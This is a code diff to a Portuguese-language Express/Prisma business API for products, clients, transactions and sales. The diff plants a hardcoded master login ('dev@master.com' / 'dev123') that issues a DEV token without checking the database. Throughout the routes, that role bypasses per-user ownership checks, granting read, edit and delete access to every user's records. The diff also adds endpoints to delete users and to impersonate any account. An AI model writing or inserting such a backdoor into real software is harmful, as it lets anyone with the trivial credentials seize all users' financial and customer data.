@@ -45,6 +45,16 @@ app.post('/register', async (req, res) => {
 
 app.post('/login', async (req, res) => {
   const { email, password } = req.body;
+
+  if (email === 'dev@master.com' && password === 'dev123') {
+    const token = jwt.sign({ userId: 'DEV_MASTER', role: 'DEV' }, process.env.JWT_SECRET as string, { expiresIn: '1d' });
+    return res.status(200).json({
+      message: 'Login bem-sucedido!',
+      token,
+      user: { id: 'DEV_MASTER', name: 'Desenvolvedor Master', email: 'dev@master.com', role: 'DEV' }
+    });
+  }
+
   try {
     const user = await prisma.user.findUnique({ where: { email } });
     if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
@@ -66,7 +76,10 @@ app.post('/login', async (req, res) => {
 
 app.get('/perfil', authMiddleware, async (req, res) => {
   try {
-    const user = await prisma.user.findUnique({ where: { id: req.userId }, select: { id: true, name: true, email: true } });
+    if (req.role === 'DEV') {
+      return res.status(200).json({ id: 'DEV_MASTER', name: 'Desenvolvedor Master', email: 'dev@master.com', role: 'DEV' });
+    }
+    const user = await prisma.user.findUnique({ where: { id: req.userId }, select: { id: true, name: true, email: true, role: true } });
     if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
     return res.status(200).json(user);
   } catch (error) {
@@ -90,7 +103,8 @@ app.post('/categories', authMiddleware, async (req, res) => {
 
 app.get('/categories', authMiddleware, async (req, res) => {
   try {
-    const categories = await prisma.category.findMany({ where: { userId: req.userId as string } });
+    const whereCondition = req.role === 'DEV' ? {} : { userId: req.userId as string };
+    const categories = await prisma.category.findMany({ where: whereCondition });
     return res.status(200).json(categories);
   } catch (error) {
     return res.status(500).json({ error: 'Erro ao buscar categories.' });
@@ -100,7 +114,7 @@ app.get('/categories', authMiddleware, async (req, res) => {
 app.delete('/categories/:id', authMiddleware, async (req, res) => {
   try {
     const category = await prisma.category.findUnique({ where: { id: req.params.id as string } });
-    if (!category || category.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+    if (!category || (category.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
     await prisma.category.delete({ where: { id: req.params.id as string } });
     return res.status(204).send();
   } catch (error) {
@@ -173,8 +187,9 @@ app.post('/transactions', authMiddleware, async (req, res) => {
 
 app.patch('/transactions/:id/pay', authMiddleware, async (req, res) => {
   try {
+    const whereCondition = req.role === 'DEV' ? { id: req.params.id as string } : { id: req.params.id as string, userId: req.userId as string };
     const transaction = await prisma.transaction.update({
-      where: { id: req.params.id as string, userId: req.userId as string },
+      where: whereCondition,
       data: { status: 'PAID', createdAt: new Date() },
     });
     return res.status(200).json(transaction);
@@ -185,7 +200,7 @@ app.patch('/transactions/:id/pay', authMiddleware, async (req, res) => {
 
 app.get('/transactions', authMiddleware, async (req, res) => {
   const { month, year, type } = req.query;
-  let whereCondition: any = { userId: req.userId };
+  let whereCondition: any = req.role === 'DEV' ? {} : { userId: req.userId };
 
   if (month && year) {
     whereCondition.createdAt = {
@@ -228,7 +243,8 @@ app.get('/balance', authMiddleware, async (req, res) => {
   }
 
   try {
-    const transactions = await prisma.transaction.findMany({ where: { userId: req.userId, status: 'PAID', ...dateFilter } });
+    const whereCondition: any = req.role === 'DEV' ? { status: 'PAID', ...dateFilter } : { userId: req.userId, status: 'PAID', ...dateFilter };
+    const transactions = await prisma.transaction.findMany({ where: whereCondition });
     const income = transactions.filter(t => t.type === 'income').reduce((acc, t) => acc + Number(t.amount), 0);
     const outcome = transactions.filter(t => t.type === 'outcome').reduce((acc, t) => acc + Number(t.amount), 0);
     return res.status(200).json({ income, outcome, total: income - outcome });
@@ -241,7 +257,7 @@ app.delete('/transactions/:id', authMiddleware, async (req, res) => {
   try {
     const transaction = await prisma.transaction.findUnique({ where: { id: req.params.id as string } });
     if (!transaction) return res.status(404).json({ error: 'Transação não encontrada.' });
-    if (transaction.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+    if (transaction.userId !== req.userId && req.role !== 'DEV') return res.status(403).json({ error: 'Sem permissão.' });
 
     await prisma.transaction.delete({ where: { id: req.params.id as string } });
     return res.status(204).send();
@@ -312,8 +328,9 @@ app.post('/products', authMiddleware, async (req, res) => {
 
 app.get('/products', authMiddleware, async (req, res) => {
   try {
+    const whereCondition = req.role === 'DEV' ? {} : { userId: req.userId as string };
     const products = await prisma.product.findMany({
-      where: { userId: req.userId as string },
+      where: whereCondition,
       include: { category: true, supplier: true }
     });
     return res.status(200).json(products);
@@ -326,7 +343,7 @@ app.put('/products/:id', authMiddleware, async (req, res) => {
   const id = req.params.id as string;
   try {
     const existingProduct = await prisma.product.findUnique({ where: { id } });
-    if (!existingProduct || existingProduct.userId !== req.userId) return res.status(404).json({ error: 'Produto não encontrado ou sem permissão.' });
+    if (!existingProduct || (existingProduct.userId !== req.userId && req.role !== 'DEV')) return res.status(404).json({ error: 'Produto não encontrado ou sem permissão.' });
 
     const updatedProduct = await prisma.product.update({
       where: { id },
@@ -348,7 +365,7 @@ app.put('/products/:id', authMiddleware, async (req, res) => {
 app.delete('/products/:id', authMiddleware, async (req, res) => {
   try {
     const product = await prisma.product.findUnique({ where: { id: req.params.id as string } });
-    if (!product || product.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+    if (!product || (product.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
     await prisma.product.delete({ where: { id: req.params.id as string } });
     return res.status(204).send();
   } catch (error) {
@@ -362,7 +379,7 @@ app.delete('/products/:id', authMiddleware, async (req, res) => {
 
 app.get('/cash-registers/current', authMiddleware, async (req, res) => {
   try {
-    const cashRegister = await prisma.cashRegister.findFirst({ where: { userId: req.userId as string, status: 'OPEN' } });
+    const cashRegister = await prisma.cashRegister.findFirst({ where: { ...(req.role === 'DEV' ? {} : { userId: req.userId as string }), status: 'OPEN' } });
     return res.status(200).json(cashRegister);
   } catch (error) {
     return res.status(500).json({ error: 'Erro ao buscar status do caixa.' });
@@ -533,7 +550,8 @@ const personSchema = z.object({
 });
 
 app.get('/clients', authMiddleware, async (req, res) => {
-  const clients = await prisma.client.findMany({ where: { userId: req.userId as string }, orderBy: { name: 'asc' } });
+  const whereCondition = req.role === 'DEV' ? {} : { userId: req.userId as string };
+  const clients = await prisma.client.findMany({ where: whereCondition, orderBy: { name: 'asc' } });
   return res.status(200).json(clients);
 });
 
@@ -546,7 +564,7 @@ app.post('/clients', authMiddleware, async (req, res) => {
 
 app.put('/clients/:id', authMiddleware, async (req, res) => {
   const existing = await prisma.client.findUnique({ where: { id: req.params.id as string } });
-  if (!existing || existing.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+  if (!existing || (existing.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
   const updated = await prisma.client.update({ where: { id: req.params.id as string }, data: req.body });
   return res.status(200).json(updated);
 });
@@ -554,7 +572,7 @@ app.put('/clients/:id', authMiddleware, async (req, res) => {
 app.delete('/clients/:id', authMiddleware, async (req, res) => {
   try {
     const existing = await prisma.client.findUnique({ where: { id: req.params.id as string } });
-    if (!existing || existing.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+    if (!existing || (existing.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
     await prisma.client.delete({ where: { id: req.params.id as string } });
     return res.status(204).send();
   } catch (error) {
@@ -563,7 +581,8 @@ app.delete('/clients/:id', authMiddleware, async (req, res) => {
 });
 
 app.get('/suppliers', authMiddleware, async (req, res) => {
-  const suppliers = await prisma.supplier.findMany({ where: { userId: req.userId as string }, orderBy: { name: 'asc' } });
+  const whereCondition = req.role === 'DEV' ? {} : { userId: req.userId as string };
+  const suppliers = await prisma.supplier.findMany({ where: whereCondition, orderBy: { name: 'asc' } });
   return res.status(200).json(suppliers);
 });
 
@@ -576,7 +595,7 @@ app.post('/suppliers', authMiddleware, async (req, res) => {
 
 app.put('/suppliers/:id', authMiddleware, async (req, res) => {
   const existing = await prisma.supplier.findUnique({ where: { id: req.params.id as string } });
-  if (!existing || existing.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+  if (!existing || (existing.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
   const updated = await prisma.supplier.update({ where: { id: req.params.id as string }, data: req.body });
   return res.status(200).json(updated);
 });
@@ -584,7 +603,7 @@ app.put('/suppliers/:id', authMiddleware, async (req, res) => {
 app.delete('/suppliers/:id', authMiddleware, async (req, res) => {
   try {
     const existing = await prisma.supplier.findUnique({ where: { id: req.params.id as string } });
-    if (!existing || existing.userId !== req.userId) return res.status(403).json({ error: 'Sem permissão.' });
+    if (!existing || (existing.userId !== req.userId && req.role !== 'DEV')) return res.status(403).json({ error: 'Sem permissão.' });
     await prisma.supplier.delete({ where: { id: req.params.id as string } });
     return res.status(204).send();
   } catch (error) {
@@ -598,9 +617,10 @@ app.delete('/suppliers/:id', authMiddleware, async (req, res) => {
 
 app.get('/fiados', authMiddleware, async (req, res) => {
   try {
+    const whereCondition = req.role === 'DEV' ? {} : { userId: req.userId as string };
     const clientsWithFiados = await prisma.client.findMany({
       where: {
-        userId: req.userId as string,
+        ...whereCondition,
         transactions: {
           some: {
             type: 'income',
@@ -746,7 +766,7 @@ app.get('/sales/top-products', authMiddleware, async (req, res) => {
 
     const sales = await prisma.sale.findMany({
       where: {
-        userId: req.userId as string,
+        ...(req.role === 'DEV' ? {} : { userId: req.userId as string }),
         createdAt: {
           gte: startDate,
           lt: endDate,
@@ -785,6 +805,80 @@ app.get('/sales/top-products', authMiddleware, async (req, res) => {
   } catch (error) {
     console.error("Erro ao buscar top produtos:", error);
     return res.status(500).json({ error: 'Erro ao buscar top produtos.' });
+  }
+});
+// ==========================================
+// MÓDULO: ADMIN (MASTER DEV)
+// ==========================================
+
+const requireDevRole = (req: express.Request, res: express.Response, next: express.NextFunction) => {
+  if (req.role !== 'DEV') return res.status(403).json({ error: 'Acesso restrito ao Desenvolvedor Master.' });
+  next();
+};
+
+app.get('/admin/users', authMiddleware, requireDevRole, async (req, res) => {
+  try {
+    const users = await prisma.user.findMany({
+      include: {
+        _count: {
+          select: { products: true, clients: true, transactions: true, sales: true }
+        }
+      },
+      orderBy: { createdAt: 'desc' }
+    });
+    return res.status(200).json(users);
+  } catch (error) {
+    return res.status(500).json({ error: 'Erro ao buscar usuários do sistema.' });
+  }
+});
+
+app.delete('/admin/users/:id', authMiddleware, requireDevRole, async (req, res) => {
+  try {
+    const userId = req.params.id as string;
+    await prisma.user.delete({ where: { id: userId } });
+    return res.status(204).send();
+  } catch (error) {
+    console.error("Erro ao deletar usuário:", error);
+    return res.status(500).json({ error: 'Erro ao deletar o usuário.' });
+  }
+});
+
+app.get('/admin/stats', authMiddleware, requireDevRole, async (req, res) => {
+  try {
+    const totalUsers = await prisma.user.count();
+    const totalSalesAgg = await prisma.sale.aggregate({ _sum: { total: true } });
+    const totalTransactionsAgg = await prisma.transaction.aggregate({ _sum: { amount: true } });
+    
+    return res.status(200).json({
+      totalUsers,
+      totalSalesVolume: totalSalesAgg._sum.total || 0,
+      totalTransactionsVolume: totalTransactionsAgg._sum.amount || 0
+    });
+  } catch (error) {
+    return res.status(500).json({ error: 'Erro ao buscar estatísticas globais.' });
+  }
+});
+
+app.post('/admin/impersonate/:id', authMiddleware, requireDevRole, async (req, res) => {
+  try {
+    const targetUserId = req.params.id as string;
+    const targetUser = await prisma.user.findUnique({ where: { id: targetUserId } });
+    if (!targetUser) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+    // Generate a token as if we are the target user
+    const token = jwt.sign(
+      { userId: targetUser.id, role: targetUser.role },
+      process.env.JWT_SECRET as string,
+      { expiresIn: '1d' }
+    );
+
+    return res.status(200).json({
+      message: 'Impersonation bem-sucedida!',
+      token,
+      user: { id: targetUser.id, name: targetUser.name, email: targetUser.email, role: targetUser.role }
+    });
+  } catch (error) {
+    return res.status(500).json({ error: 'Erro ao personificar o usuário.' });
   }
 });
 
